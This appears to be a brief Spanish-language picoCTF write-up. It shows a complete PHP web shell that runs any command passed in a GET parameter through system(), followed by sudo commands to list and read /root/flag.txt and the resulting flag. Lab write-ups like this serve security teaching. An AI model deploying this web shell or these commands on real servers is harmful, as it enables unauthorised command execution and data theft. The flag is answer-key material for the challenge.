Vemos que el servidor corre php, y cargamos un payload que tenia de antes 
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```


```bash
sudo -l
sudo ls /root
sudo cat /root/flag.txt
```
```flag
picoCTF{wh47_c4n_u_d0_wPHP_712a9451}
```